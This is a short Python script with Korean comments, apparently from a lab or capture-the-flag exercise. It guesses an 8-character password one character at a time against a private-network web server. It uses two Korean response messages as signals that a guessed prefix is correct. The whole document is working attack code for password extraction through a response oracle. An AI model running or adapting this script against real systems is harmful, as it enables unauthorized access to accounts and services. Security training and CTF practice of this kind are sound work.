import requests
import string

# 사용할 문자셋
chars = string.ascii_letters + string.digits

# 공격 대상 URL
url = 'http://192.168.75.171:8000'

# 비밀번호 추측
passwd = ''
for i in range(8):
    for char in chars:
        test_password = passwd + char
        response = requests.get(url, params={'pw': test_password})
        print(test_password)

        if "끄아아아아아악" in response.text:
            passwd += char
            print(f"현재 비밀번호: {passwd}")
            break

        elif "흠 거의 맞았다고 할 수 있지" in response.text:
            passwd += char
            print(f"현재 비밀번호: {passwd}")
            break

print("비밀번호 찾음: " + passwd)
